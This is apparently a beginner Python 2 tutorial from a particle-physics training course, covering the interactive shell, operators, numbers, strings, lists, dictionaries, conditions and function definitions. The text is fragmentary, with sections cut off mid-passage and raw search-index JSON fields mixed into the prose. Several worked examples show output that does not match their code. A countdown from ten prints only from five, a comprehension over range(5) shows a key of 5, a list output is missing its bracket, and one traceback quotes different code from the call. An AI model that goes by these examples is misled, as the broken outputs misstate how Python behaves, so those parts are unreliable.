It’s widely used used in the \nscientific community due to the broad selection of feature-rich, actively \nmaintained libraries. This means that a lot of software has already been \nwritten to solve problems common to our field, so you can concentrate on the \ninteresting stuff!\nIn LHCb, Python is used for lots of things, particularly for writing files that \nmake ntuples for you, but also for many analyses.\nUnless you are absolutely forced to use another language by external \nconstraints, such as your fit program already being written in C++, we \nrecommend using Python, even if you’re not comfortable with it right now. This \nis because there’s a large support group of other people who can help you with \nproblems you might have down the line, and because we believe it’s the best \ntool, all in all, for data analysis.\nAim of these lessons\nThere are already plenty of superb guides on the Internet for learning \nPython, all of which will be more comprehensive than this one. This particular \nguide exists because it closely follows what we teach at the \nStarterkit, where we teach Python over the course of one day, and \nso only teaches you what you need to follow along in the lessons that are \nspecific to high-energy physics.\nWe expect you to be familiar with at least one other programming language, so \nthat you understand sentences like \"we assign value 123 to variable abc\" and \n\"this is a function which accepts two arguments\".

Either way, a simple way to get Python on your \ncomputer is to install Anaconda.\n Python 3?You might see material that talks about Python 3. Like a lot of other software, \nPython is regularly updated and groups batches of updates, including bug fixes \nand new features, into versions. The interesting thing about Python 3 is that \nit isn’t backwards compatible with Python 2. This means that code that works \nwhen run with version 2 of Python may not necessarily work when run with \nversion 3. Python 2 was around for a long time, and so the process of migrating to Python 3 has been slow, which is why so many people talk about it.\nIndeed, LHCb software is not compatible with Python 3, and so we use Python 2 \nin these lessons. In general, and out in the real world, Python 3 is preferred \nas it receives the most focus from the people who make Python. If you’re \nstarting a new project, and don’t have to use LHCb software, consider trying to \nuse Python 3. You can install both Python 2 and Python 3 using \nAnaconda.\n\nPython is a very user-friendly language.

This is just like bash, where you type your command, run \nit, see the results, and can then type the next line. Sometimes there are no \nresults, so you don’t see anything being printed (just like running the true \ncommand in bash).\nYou can leave the session by running exit(), or by using the Ctrl-d key \ncombination.\nEverything that can be done in Python can be done in an interactive session; \nit’s a great way to experiment.

The \nanswer is the dot operator ..\n>>> math.sin\n\n\nOperators are special pieces of the syntax of a programming language.\nSyntax is the way you express what you want to do.\nIn Python, an operator acts on the thing that’s on the right of it using the \nthing on the left. In the example we just saw, the dot operator . acts on \nmath in a way that, somehow, retrieves a method called math.sin. We can \nthen use that method straight away:\n>>> math.pi\n3.141592653589793\n>>> math.sin(math.pi)\n1.2246467991473532e-16\n\nHere we see there’s also a property of math called pi, which seems to \nhave the appropriate value.\nWe could also store the result of math.sin in a variable, and use it later.\n>>> twopi = 2*math.pi\n>>> my_sin = math.sin\n>>> my_sin(twopi)\n-2.4492935982947064e-16\n\nThere are several symbols that can be used as operators, like +, -, *, \nand /. Certain things support the use of certain operators. For example, \nnumbers support the plus operator:\n>>> 1 + 2\n3\n\nThe plus operator acts on 1 with 2, and, somehow, 1 knows how to deal \nwith 2, in this case by performing addition as we know it.\nWhen we do 1 + 2, what’s going on behind the scenes is exactly the same as \nwhen do math.sin. Observe!\n>>> (1).__add__\n\n>>> (1).__add__(2)\n3\n\nNumbers have a special __add__ method attached to them, in the same way \nthat math has a sin method attached. The plus operator + is just a \nshortcut for accessing this __add__ method. The double underscores either \nside of the name tell you that there’s something special about it; in this case \nit means that you can use the plus operator + instead.\n Methods for other operatorsThe other operators that you can use with numbers have corresponding methods. \nWhat other operator methods are available? Try some of them out, and see how \nthey compare with using the operator like normal.\n SolutionClick to expandWe’ve already met two ways that you can find out what things are attached to \nsomething. In IPython, you can try (1).__, or you can always use the \ndir method.\n>>> dir(1)\n['__abs__',\n '__add__',\n '__and__',\n '__bool__',\n ...\n 'to_bytes']\n\nThen it’s just a case of scanning through this list and seeing what names look \nright. The __sub__ name looks like ‘subtraction’, and similarly __mul__ and \n__truediv__ sound like multiplication and division.\n>>> (1).__mul__(5)\n5\n>>> (1).__truediv__(5)\n0.2\n\n\nOf course, there’s also a method for the dot operator! It’s called \n__getattribute__, and it takes the name of the thing you want to get.\n>>> (1).__add__\n\n>>> (1).__getattribute__('__add__')\n\n\nSo, of course, we can do this horrible one-liner:\n>>> (1).__getattribute__('__add__')(3)\n4\n\nYou would never do something like this in your day-to-day programming, but \nwe’ve done it here to illustrate how Python performs operations.\nObjects\nThe use of the dot operator is interesting because we’re manipulating the \nfundamental building block of Python: objects. Objects are containers of \nthings, and we can access those things by name using the dot operator.\nWe can sometimes use other operators as a shorthand for accessing \nspecially-named methods within objects, like using + for __add__.\nMost things in Python are objects! Numbers, like we’ve seen, are objects, \nbecause we can retrieve things from them with ..  Of course, the object \nitself is interesting because it can represent a value, like the number \n999.\nIt the next set of lessons, we’ll go through the different types of objects \nlike come with the Python language.\n"},"python/numbers.html":{"url":"python/numbers.html","title":"Numbers","keywords":"","body":"Numbers\nThere’s nothing magical about numbers in Python, and we’ve already discovered \nhow we perform operations on them.\n>>> (2*(1 + 3) - 5)/0.5\n2\n>>> 11 % 4\n3\n\nThe only thing to keep in mind is that Python has a few different types of \nnumbers, and they can behave differently.\n>>> 10/3\n3\n>>> 10.0/3.0\n3.3333333333333335\n\nInteresting. Something different happens when we use numbers with and without \ndecimal places! This occurs because numbers given with decimal places, like \n3.14  are floats, while those without, like 3, are integers.\nFor historical reasons, dividing two integers in Python 2 returns an integer, \nwhere the intermediate result is always rounded down. Division using at least \none float gives us the more intuitive answer.\nIn Python 3, division with integers works the same way as with floats. You can \nask to have this behaviour in Python 2.\n>>> from __future__ import division\n>>> 3/4\n0.75\n>>> 3.0/4.0\n0.75\n\nBecause the default behaviour in Python 2 is quite unintuitive, we recommend \nusing the from __future__ import division line everywhere. We’ll come to what exactly this \nline is doing shortly.\nIf you do want a rounding division, you then can ask for it explicitly with \nthe // operation:\n>>> 10/3\n3.3333333333333335\n\n>>> 10//3\n3\n\n OperatorsThis behaviour can be explained in terms of operators and the double-underscore \nmethods. You can see that numbers have two methods for division:\n>>> dir(1)\n[...,\n '__floordiv__',\n ...\n '__truediv__',\n ...]\n\nIn Python 2, the / operator corresponded to the __floordiv__ method when \nused with integers, but the __truediv__ operator when used with floats. In \nPython 3, and when using the from __future__ import division line, the / \noperator always uses the __truediv__ method.\n\nPython also lets you manipulate complex numbers, using j to represent the \ncomplex term.\n>>> a = 1 + 4j\n>>> b= 4 - 1j\n>>> a - b\n(-3+5j)\n\nComplex numbers are objects, of course, and have some useful functions and \nproperties attached to them.\n>>> a.conjugate()\n(1-4j)\n>>> a.imag\n4.0\n>>> a.real\n1.0\n\nSomewhat confusingly, computing the magnitude of a complex number can be done \nwith the abs method, which is available globally.\n>>> abs(a)\n4.123105625617661\n>>> import math\n>>> math.sqrt(a.real**2 + a.imag**2)\n4.123105625617661\n\nThis also demonstrates the ** operator, which for real numbers corresponds to \nexponentiation.\nEach type of number can be created literally, like we’ve been doing, by just \ntyping the number into your shell or source code, and by using the correspond \nmethods.\n>>> int()\n0\n>>> float()\n0.0\n>>> complex()\n0j\n\n"},"python/strings.html":{"url":"python/strings.html","title":"Strings","keywords":"","body":"Strings\nNumber objects are useful for storing values which are, well, numbers.

There’s no difference; most people choose \none and stick with it.\nIt can be useful to change if your text contains the quote character.

This is useful because we can copy-paste the \nstring into some Python code to use it somewhere else, without having to worry \nabout escaping things.\nWe can create multi-line strings by using three quotation marks. \nConventionally, double quotations are usually used for these.\n>>> long_fact = \"\"\"This is a long string.\n...\n...

You can also use \\n in strings to insert line breaks.\n>>> 'This is a long string\\n\\nQuite long indeed.\\n'\n\nWe can convert things to strings by using the str method, which can also \ncreate an empty string for us.\n>>> str()\n''\n>>> 'A number: ' + str(999 - 1)\n'A number: 998'\n\nStrings are objects, and have lots of useful methods attached to them. If you \nwant to know how many characters are in a string, you use the global len \nmethod.\n>>> b.upper()\n'A CARROT'\n>>> b.upper().lower()\n'a carrot'\n>>> b.replace('carrot', 'parrot').replace(' ', '_')\n'A_parrot'\n>>> len(b)\n8\n>>> b\n'A carrot'\n\nNotice that none of these operations modify the value of the b variable. \nOperations on strings always return new strings. Strings are said to be \nimmutable for this reason: you can never change a string, just make new ones.\nFormatting\nOne of the most common things you’ll find yourself doing with strings is \ninterleaving values into them. For example, you’ve finished an amazing \nanalysis, and want to print the results.\n>>> result1 = 123.0\n>>> result2 = 122.3\n>>> print 'My results are: ' + str(result1) + ', ' + str(result2)\nMy results are: 123.0, 122.3\n\nThis is already quite ugly, and will only get worse with more results. We can \ninstead use the format method that’s available on strings, and use the \nspecial {} placeholders to say where we want the values to go in the string.\n>>> template = 'My results are: {0}, {1}'\n>>> print template.format(result1, result2)\nMy results are: 123.0, 122.3\n\nMuch better! We define the whole string at once, and then place the missing \nvalues in later.\nThe numbers inside the placeholders, {0} and {1}, correspond to the indices \nof the arguments passed to the format method, where 0 is the first \nargument, 1 is the second, and so on. By referencing positions like this, we \ncan easily repeat placeholders in the string, but only pass the values once to \nformat.\n>>> template2 = 'My results are: {0}, {1}. But the best is {0}, obviously.'\n>>> print template2.format(result1, result2)\nMy results are: 123.0, 122.3. But the best is 123.0, obviously.\n\nYou can also use named placeholders, then passing the values to format \nusing the same name.\n>>> template3 = 'My results are: {best}, {worst}. But the best is {best}, obviously.'\n>>> print template3.format(best=result1, worst=result2)\nMy results are: 123.0, 122.3. But the best is 123.0, obviously.\n\nThis is nice because it gives more meaning to what the placeholders are for.\nThere’s a lot you can do inside the placeholders, such as specifying that you want to format a number with a certain number of decimal places.\n>>> print 'This number is great: {0:.3f}'.format(result1)\nThis number is great: 123.000\n\nIf you want to print a literal curly brace using format, you will need to\nescape it by doubling it, so that {{ will become { and }} will become }.\nHere's an example:\n>>> print 'This number will be surrounded by curly braces: {{{0}}}'.format(123)\nThis number will be surrounded by curly braces: {123}\n\nThe innermost {0} is replaced with the number, and {{...}} becomes {...}.\n"},"python/lists.html":{"url":"python/lists.html","title":"Lists and looping","keywords":"","body":"Lists and looping\nNow things start to get really interesting! Lists are collections of things \nstored in a specific order. They can be defined literally by wrapping things in \nsquare brackets [], separating items with commas ,.\n>>> a = [4, 2, 9, 3]\n>>> a\n[4, 2, 9, 3]\n\nPython lists can contain collections of whatever you like.\n>>> excellent = [41, 'Hello', math.sin]\nEach item in the list can be accessed by its index, its position in the list, \nwhich starts at zero for the first item. Indexing by negative numbers starts \nfrom the last item of the list.\n>>> a[0]\n4\n>>> a[2]\n9\n>>> a[-1]\n3\n\nWe’ll get an error if we try to access an index that doesn’t exist:\n>>> a[99]\nTraceback (most recent call last):\n  File \"\", line 1, in \nIndexError: list index out of range\n\nLike strings, lists have a length which can be found with the len method.\n>>> len(a)\n4\n\nUnlike strings, lists are mutable, which means we can modify lists in-place, \nwithout creating a new one.\n>>> a.append(45)\n>>> a\n[4, 2, 9, 3, 45]\n>>> len(a)\n5\n\nWe can see that lists are mutable because using the append method didn’t \nprint anything, and our variable a now has a different value.\nBecause lists are mutable, we can use the special del keyword to remove \nspecific indices from the list.\n>>> del a[-2]\n>>> a\n[4, 2, 9, 45]\n\n Functions and keywordsdel is a language keyword representing an action, and not a function. The\nsyntactic difference is that functions take their arguments between parentheses,\nsuch as my_function(1, 2, 3), whereas del does not.\n\nYou can retrieve sub-lists by using slice notation whilst indexing.\n>>> a[1:-1]\n[2, 9]\n\nThis retrieves the part of list a starting from index 1 until just before \nindex -1. The indexing is ‘exclusive’ in that it excludes the item of the \nlast index. This is the convention of indexing in Python.\nYou can omit a number in the first or second indexing position, and Python will \nassume you mean the first element (index zero) and last element (index \nlen(array)).\n>>> a[:-2]\n[4, 2\n>>> a[1:]\n[2, 9, 45]\n>>> a[:]\n[4, 2, 9, 45]\n\nSlicing returns a copy of the array, so modifying the return value doesn’t \naffect the original array.\n>>> b = a[1:]\n>>> b\n[2, 9, 45]\n>>> b[0] = 3\n>>> b\n[3, 9, 45]\n>>> a\n[4, 2, 9, 45]\n\nWe did something cool there by assigning a value to a specific index, b[0] =\n3. The same trick works with slices.\n>>> b[:2] = [99, 2, 78]\n>>> b\n[99, 2, 78, 45]\n\nThis is equivalent of replacing a certain range (:2, or items at position 0\nand 1) of the list b with other items from another list. Note that in our\nexample we replace 2 elements with 3. The same syntax might be used for\ninserting elements at an arbitrary position in the list. If we want to insert\nthe number 2 between the 6 and the 78 in the list above, we would use:\n>>> b[2:0] = [6]\n>>> b\n[99, 2, 6, 78, 45]\n\nmeaning take out 0 elements from the list starting a position 2 and insert the\ncontent of the list [6] in that position.\n Copying a listSlicing creates a copy, so what notation could you use to copy the full list?\n SolutionClick to expandYou need to slice from the very beginning to the very end of the list.\n>>> a[:]\n[4, 2, 9, 45]\n\nThis is equivalent to specifying the indices explicitly.\n>>> a[0:len(a)]\n[4, 2, 9, 45]\n\n\nLooping\nWhen you’ve got a collection of things, it’s pretty common to want to access \neach one sequentially. This is called looping, or iterating, and is super easy.\n>>> for item in a:\n...     print item\n...\n4\n2\n9\n45\n\nWe have to indent the code inside the for loop to tell Python that these\nlines should be run for every iteration.\n Indentation in PythonThe for loop is a block, and every Python block requires indentation, unlike\nother \"free-form\" languages such as C++ or Java. This means that Python will\nthrow an error if you don't indent:\n>>> for i in b:\n... print i\n  File \"\", line 2\n    print i\n        ^\nIndentationError: expected an indented block\n\nIndentation must be consistent within the same block, so if you indent two lines\nin the same for loop using a different number of spaces, Python will complain\nonce again:\n>>> for i in b:\n...   print \"I am in a loop\"\n...     print i\n  File \"\", line 3\n    print i\n    ^\nIndentationError: unexpected indent\n\nIndentation is necessary as Python does not use any keyword or symbol to\ndetermine the end of a block (e.g. there is no endfor). As a side effect,\nindentation forces you to make your code more readable!\nNote that it does not matter how many spaces you use for indentation. As a\nconvention, we are using four spaces.\n\nThe variable name item can be whatever we want, but its value is changed by \nPython to be the element of the item we’re currently on, starting from the \nfirst.\nBecause lists are mutable, we can try to modify the length of the list whilst \nwe’re iterating.\n>>> a_copy = a[:]\n>>> for item in a_copy:\n...     del a_copy[0]\n...\n>>> a_copy\n[9, 45]\n\nIntuitively, you might expect a_copy to be empty, but it’s not! The technical\nreasons aren’t important, but this highlights an important rule: never\nmodify the length of a list whilst iterating over it! You won’t end up with\nwhat you expect.\nYou can, however, freely modify the values of each item in the list whilst \nlooping. This is a very common use case.\n>>> a_copy = a[:]\n>>> i = 0\n>>> for item in a_copy:\n...     a_copy[i] = 2*item\n...     i += 1\n...\n>>> a_copy\n[8, 4, 18, 90]\n\nKeeping track of the current index ourselves, with i is annoying, but luckily \nPython gives us a nicer way of doing that.\n>>> a_doubled = a[:]\n>>> for index, item in enumerate(a_doubled):\n...     a_doubled[index] = 2*item\n...\n>>> a_doubled\n[8, 4, 18, 90]\n\nThere’s a lot going on here. Firstly, note that Python lets you assign values \nto multiple variables at the same time.\n>>> one, two = [34, 43]\n>>> print two, one\n43 34\n\nThat’s already pretty cool! But then think about what happens if you had a list \nwhere each item was another list, each containing two numbers.\n>>> nested = [[20, 29], [30, 34]]\n>>> for item in nested:\n...     print item\n...\n[20, 29]\n[30, 34]\n\nSo, we can just assign each item in the sublist to separate variables in the \nfor statement.\n>>> for one, two in nested:\n...     print two, one\n...\n29 20\n34 30\n\nNow we can understand a little better what enumerate does: for each item in \nthe list, it returns a new list containing the current index and the item.\n>>> enumerate(a)\n\n>>> list(enumerate(a))\n[(0, 4), (1, 2), (2, 9), (3, 45)]\n\nFor performance reasons enumerate doesn’t return a list directly, but instead\nsomething that the for statement knows how to iterate over (this is called a\ngenerator and for the moment you\ndon't need to know how it works). We can convert it to a list with the list\nmethod when we want to see what’s it doing.\nThis technique of looping over lists of lists lets us loop over two lists \nsimultaneously, using the zip method.\n>>> for item, item2 in zip(a, a_doubled):\n...     print item2, item\n...\n8 4\n4 2\n18 9\n90 45\n\nNeat! As before, we can see what zip is doing explicitly by using list.\n>>> list(zip(a, a_doubled))\n[(4, 8), (2, 4), (9, 18), (45, 90)]\n\nYou can see that the structure of the list that’s iterated over, the output of \nzip, is identical to that for enumerate.\nFinally, we’ll take a quick look at the range method.\n>>> range(0, 10)\n[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\n\nThe arguments to range work just like slicing, the second argument is treated \nexclusively, as its value is excluded from the output. Again like slicing, we \ncan specify a third argument as the step size for the iteration.\n>>> range(0, 10, 2)\n[0, 2, 4, 6, 8]\n\nIf you only give a single argument to range, it assumes you’ve given the end \nvalue, and want a starting value of zero.\n>>> range(5)\n[0, 1, 2, 3, 4]\n\nThis reads “give me a list of length 5, in steps of 1, starting from zero”.\nNow that we know how to easily generating sequences of numbers, we can write \nenumerate by hand!\n>>> for index, item in zip(range(len(a)), a):\n...     print index, item\n...\n0 4\n1 2\n2 9\n3 45\n\nJust like before! When you see something cool like enumerate, it can be fun \ntrying to see how you’d accomplish something similar with different building \nblocks.\nList comprehension\nWe’ve already made a new list from an existing one when we created a_doubled.\n>>> a_doubled = a[:]\n>>> for index, item in enumerate(a_doubled):\n...     a_doubled[index] = 2*item\n\nCreating a new list from an existing one is a common operation, so Python has a \nshorthand syntax called list comprehension.\n>>> a_doubled = [2*item for item in a]\n>>> a_doubled\n[8, 4, 18, 90]\n\nIsn’t that beautiful?\nWe can use the same multi-variable stuff we learnt whilst looping.\n>>> [index*item for index, item in enumerate(a)]\n[0, 2, 18, 135]\n\nWe’re not restricted to creating new lists with the same structure as the \noriginal.\n>>> [[item, item*item] for item in a]\n[[4, 16], [2, 4], [9, 81], [45, 2025]]\n\nWe can even filter out items from the original list using if.\n>>> [[item, item*item] for item in a if item % 2 == 0]\n[[4, 16], [2, 4]]\n\nList comprehensions are a powerful way of succinctly creating new lists. But be \nresponsible; if you find you’re doing something complicated, it’s probably \nbetter to write a full for loop.\nTuples\nA close relative of lists are tuples, which differ in that they cannot be \nmutated after creation.  You can create tuples literally using parentheses, or \nconvert things to tuples using the tuple method.\n>>> a = (3, 4)\n>>> del a[0]\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: 'tuple' object doesn't support item deletion\n>>> a.append(5)\nTraceback (most recent call last):\n  File \"\", line 1, in \nAttributeError: 'tuple' object has no attribute 'append'\n>>> a[0] = 1\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: 'tuple' object does not support item assignment\n>>> b = tuple([65, 'yes'])\n>>> b\n(65, 'yes')\n\nTuples are usually used to describe data whose length is meaningful in and of \nitself. For example, you could express coordinates as a tuple.\n>>> coords = (3.2, 0.1)\n>>> x, y = coords\n\nThis is nice because it doesn’t make sense to append to an (x,y)(x, y)(x,y) \ncoordinate, nor to ‘delete’ a dimension. Generally, it can be useful if the \ndata structure you’re using respects the meaning of the data you’re storing.\nIf you can’t think of a use for tuples yourself, its worth keeping in mind that \nPython using creates tuples for groups of things by default. We saw that \nearlier when we used enumerate.\n>>> list(enumerate([4, 9]))\n[(0, 4), (1, 9)]\n\nEach element of the list is a tuple.\n Write a list comprehension yourselfCompute the square of the magnitude of the sum of the following two \nthree-vectors, using a single list comprehension and the global sum method.\n>>> kaon = [3.4, 4.3, 20.0]\n>>> pion = [1.4, 0.9, 19.8]\n\nIt might help to first think about how you’d compute the quantity for a single \nvector.\n SolutionClick to expandNot sure what the sum method does? Ask for help!\n>>> help(sum)\n\nThe square magnitude is the sum of the squares of the components, where the \ncomponents are the sum of the two input vectors.\n>>> magsq = sum([(k + pi)**2 for k, pi in zip(kaon, pion)])\n\nThe square root of this is around 40.42.\n\n"},"python/dictionaries.html":{"url":"python/dictionaries.html","title":"Dictionaries","keywords":"","body":"Dictionaries\nYou can think of lists as a mapping from indices to values. The indices are\nalways integers and go from 0 to len(the_list), and the values are the\nitems.\nDictionaries are collections, just like lists, but they have important\ndifferences:\n\nlists map sequential numeric indices to items, whereas dictionaries can map\nmost object types to any object,\nlists are ordered collections of items, whereas dictionaries have no\nordering.\n\nSince anything can be used as index for an item, indices must be always\nspecified when creating a dictionary:\n>>> d = {1: 0.5, 'excellent index': math.sin, 0.1: 2}\n>>> d[1]\n0.5\n>>> d['excellent index']\n\n>>> d[0.1] = 3\n\nThe \"indicies\" of a dictionary are called keys, and the things they map to\nare values. Together, each key-value pair is an item.\n>>> d.keys()\n[1, 0.1, 'excellent index']\n>>> d.values()\n[0.5, 2, ]\n>>> d\n{0.1: 2, 1: 0.5, 'excellent index': }\n\nAs you can see, the values of a dictionary can be whatever we like, and need not\nbe the same type of object.\nYou can see that the order of the keys, values and items we get back are not the\nsame as the order we created the dictionary with. If you run the same example on\nyour own you might get a different ordering. This is what we mean when we define\ndictionaries as unordered collections: when you iterate over its content, you\ncannot rely on the ordering.\nIt is however guaranteed that the n-th item returned by keys() corresponds\nto the n-th item returned by values(). This allows the following example\nto work flawlessly:\n>>> for key, value in zip(d.keys(), d.values()):\n...     print key, ':', value\n...\n1 : 0.5\n0.1 : 3\nexcellent index : \n\nOf course, this could be considerably simpler just by using items(), which\ngives us tuples of key-value pairs.\n>>> for key, value in d.items():\n...     print key, ':', value\n...\n1 : 0.5\n0.1 : 3\nexcellent index : \n\nWe can create dictionaries from lists of 2-item lists.\n>>> dict(enumerate(['a thing', 'another']))\n{0: 'a thing', 1: 'another'}\n\nAnd also with dictionary comprehensions, in a similar manner to list\ncomprehensions, with the additional specification of the key.\n>>> {i: i**i for i in range(5) if i != 3}\n{0: 1, 1: 1, 2: 4, 4: 256, 5: 3125}\n\nNote that dictionary comprehensions require at least Python 2.7 to work.\nDictionary keys\nThere’s no restriction on values a dictionary might hold, but there is on keys.\n>>> l = [1, 4, 3]\n>>> dd = {}\n>>> dd[l] = 0\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: unhashable type: 'list'\n\nIn essence, keys must not be mutable. This includes numbers, strings, and\ntuples, but not lists. This restriction is a trade-off that allows Python to\nmake accessing values in a dictionary by key very fast.\n HashingImmutable data types in Python have a __hash__() function, you can test it\nyourself:\n>>> s = \"a string\"\n>>> s.__hash__()\n-8411828025894108412\n\nA hashing function creates an\nencoded (but not unique) representation of the object as a number. When you\nlook up an item in a Python dictionary with my_dict[\"my_key\"], what happens\ninternally is:\n\nhash of \"my_key\" is calculated,\nthis number is compared to every hash of every key in the dictionary, until a\nmatch between the hashes is found,\nif two hashes match, and the two objects are really identical, the\ncorresponding dictionary item is returned.\n\nLooking up numbers instead of strings or tuples is considerably faster, but\nsince two different strings can have the same hash, their content has to be\ncompared as well to really tell whether they are equal. If two hashes are\ndifferent on the other hand we are sure that the objects are different as well.\n\nIteration over dictionaries is over their keys.\n>>> for key in d:\n...     print key, ':' d[key]\n...\n1 : 0.5\n0.1 : 3\nexcellent index : \n\nWe have already seen how to iterate over values (using d.values()) or keys\nand values simultaneously (using d.items()).\n On the efficiency of items()In Python 2, using items copies the keys and values of a dictionary, and gives\nyou back those copies. This can be problematic for large dictionaries as the\namount of memory your program uses can double. Python 3 uses a much more\nmemory-efficient way of implementing items so that you don't have to worry.\nIf you're having memory problems with using items in Python 2, you can use\nviewitems() instead, which behaves the same way as items does in Python 3.\nNote that there are also similar methods for keys and values, called\nviewkeys() and viewvalues(), and that all of these view methods are only\navailable from\nPython 2.7.\n\n Alphabet mappingMap each letter of the alphabet to a number with a dictionary comprehension,\nstarting with 0 for a and ending with 25 for z.\nYou can get a string containing the letters of the alphabet like this:\n>>> import string\n>>> string.ascii_lowercase\n'abcdefghijklmnopqrstuvwxyz'\n\nYou can iterate over a string exactly like a list.\n>>> for character in string.ascii_lowercase:\n...     print character\n...\na\nb\n...\nz\n\nThen, create the \"reverse\" dictionary, again with a comprehension, mapping\nletters to numbers.\n SolutionClick to expandYou need to have a list containing one number per letter, and to loop over that\nlist along with the characters in the string. This is exactly the same as\nlooping over items in a list alongside the index, so we can use enumerate.\n>>> alphabet_map = {i: c for i, c in enumerate(string.ascii_lowercase)}\n\nWe can create the inverse map by swapping the key and value in the\ncomprehension.\n>>> reverse_map = {c: i for i, c in alphabet_map.items()}\n\n\n"},"python/conditions.html":{"url":"python/conditions.html","title":"Conditions","keywords":"","body":"Conditions\nSometimes, often while looping, you only want to do things depending on\nsomething’s value.

This reads more naturally.\nAll Python objects are truth-like unless the have the value False, the value\nNone, or are empty collections (such as \"\", [], (), {}).\n>>> if list() or dict() or tuple() or str():\n...     print \"You won’t see me!\"\n\nThe value None, which is available as the variable named None, is often\nused as placeholder for an empty value.\n>>> favourite = None\n>>> for p in pizzas:\n...     if 'Olives' in p:\n...         favourite = p\n...\n>>> if favourite:\n...     print 'Found favourite: {0}'.format(favourite)\n... else:\n...     print 'No favourite :('\nNo favourite :(\n\nIt behaves as false-y value in conditions.\nConditions in loops\nfor loops and comprehensions are the most common ways of iterating in Python.\nWe’ve already seen that using conditions in these can be useful.\n>>> not_cheesy = [p for p in pizzas if 'cheese' not in p.lower()]\n>>> not_cheesy\n['Pineapple', 'Pepperoni', 'Hot dog']\n\nAnother way of iterating is with while.\n>>> i = 10\n>>> while i > 0:\n...     print 'T-minus {0} seconds'.format(i)\n...     # Equivalent to `i = i - 1`\n...     i -= 1\n... print 'Blast off!'\nT-minus 5 seconds\nT-minus 4 seconds\nT-minus 3 seconds\nT-minus 2 seconds\nT-minus 1 seconds\nBlast off!\n\nThe while loop checks the condition, runs the block, and then re-checks the\ncondition. If we don’t do something in the loop to change the result of the\ncondition, we will end up looping forever!\n>>> i = 5\n>>> while i > 0:\n...     print 'All work and no play makes Jack a dull boy'\n\nBecause we do not change the value of i in the loop, the condition always\nevaluates to True, so we’re stuck. You can stop Python running the code by\ntyping the Ctrl-c key combination.\nSometimes you want to stop iterating when some condition is met. You could\nachieve this with a while loop.\n>>> ok = False\n>>> i = 0\n>>> while not ok:\n...     ok =  'cheese' in pizza[i].lower()\n...     # Equivalent to `i = i + 1`\n...     i += 1\n...\n>>> i\n2\n>>> pizza[i - 1]\n'Cheese'\n\nIt is not nice to have to keep track of these ok and i variables. Instead,\nwe can use a for loop, which feels much more natural when iterating over a\ncollection, and break to stop looping.\n>>> for pizza in pizzas:\n...     if 'cheese' in pizza.lower():\n...         yum = pizza\n...         break\n...\n>>> yum\n'Cheese'\n\n"},"python/methods.html":{"url":"python/methods.html","title":"Methods","keywords":"","body":"Methods\nMethods, also called functions, take some input and return some output. We have\nalready used lots of methods, like dir, help, and len, and in this lesson\nwe will start creating are own.\nAs we have seen, methods can do a lot of stuff with very little typing. Methods\nare normally used to encapsulate small pieces of code that we want to reuse.\nLet’s rewrite len as an example.\n>>> def length(obj):\n...     \"\"\"Return the number of elements in obj.\n...\n...     obj must be iterable.\n...     \"\"\"\n...     i = 0\n...     for _ in obj:\n...         i += 1\n...     return i\n>>> length\n\n>>> help(length)\nHelp on function foo in module __main__:\n\nfoo(x)\n    Return the number of elements in obj.\n\n>>> length('A b c!')\n6\n>>> length(range(5))\n5\n\nThere’s a lot going on here, so we will break it down line-by-line.\n\ndef length(obj): methods are defined using def, followed by a space,\nand then the name you want to give the method.1 Inside the parentheses\nafter the name, we list the inputs, or arguments, that we want our method\nto accept.  In this case, we only need a single input: the thing we want to\ncompute the length of.  Finally, there’s a colon at the end, just like with\na for or if, which means a block of code follows (which must be\nindented).\n\"\"\"Return the number of elements in obj.\"\"\": This is the docstring. It’s\njust a string, defined literally with three double quotes so that we can\ninclude linebreaks. By placing a string here, Python makes the string\navailable to use when we pass our function to help. Documenting your\nfunctions is a very good idea! It makes it clear to others, and to\nfuture-you, what the method is supposed to do.\nThe method block. This is the code that will run whenever you call your\nmethod, like length([1]). The code in the block has access to the\narguments and to any variables defined before the method definition.>>> x = 1\n>>> def top_function():\n...    \"\"\"Do something silly.\"\"\"\n...    print x\n...    print y\n...\n>>> y = 2\n>>> top_function()\n1\nTraceback (most recent call last):\nFile \"\", line 1, in \nFile \"\", line 3, in top_function\nNameError: global name 'y' is not defined\n\nIn general, you should try to minimise the number of variables outside your\nmethod that you use inside. It makes figuring out what the method does much\nharder, as you have to look elsewhere in the code to find things out.\nreturn i: This defines the output of the method, the thing that you get\nback when you call the method. You don’t have to return anything, in which\ncase Python will implicitly make your function return None, or you can\nreturn multiple things at once.>>> def no_return():\n...     1 + 1\n...\n>>> no_return()\n>>> no_return() == None\n>>> def such_output():\n...     return 'wow', 'much clever', 213\n...\n>>> such_output()\n('wow', 'much clever', 213)\n>>> a, b, c = such_output()\n>>> b\n'much clever'\n\nYou can see that returning multiple things implicitly means returning a\ntuple, so we can choose to assign one variable per value while calling the\nmethod.\n\n\n1. Names are conventionally in lowercase, with underscores separating words. ↩\n\nMethods can be called in several ways.\n>>> def add(x, y):\n...    \"\"\"Return the sum of x and y.\"\"\"\n...    return x + y\n...\n>>> add(1, 2)\n>>> add(x=1, y=2)\n>>> add(1, y=2)\n>>> add(y=2, x=1)\n>>> add(y=2, 1)\n>>> add(y=2, 1)\n  File \"\", line 1\n    add(y=2, =1)\n             ^\nSyntaxError: invalid syntax\n\nSpecifying the argument’s name explicitly when calling a method is nice because\nit reminds you what the argument is supposed to do. It also means you don’t\nhave to remember the order in which the arguments were defined, you can specify\nkeyword arguments in any order. You can even mix positional arguments with\nkeyword arguments, but any keyword arguments must come last.\nUsing keyword arguments is particularly useful for arguments which act as\non/off flags, because it’s often not obvious what your True or False is\ndoing.\n>>> def add(x, y, show):\n...    \"\"\"Return the sum of x and y.\n...\n...    Optionally print the result before returning it.\n...    \"\"\"\n...    if show:\n...        print x + y\n...    return x + y\n...\n>>> _ = add(1, 2, True) # Hmm, what is True doing again?\n3\n>>> _ = add(1, 2, show=True) # Aha! Much clearer\n\nAlways having to specify that flag is annoying. It would be much nicer if\nshow had a default value, so that we don’t have to provide a value when\ncalling the method, but can optionally override it.\n>>> def add(x, y, show=False):\n...    \"\"\"Return the sum of x and y.\n...\n...

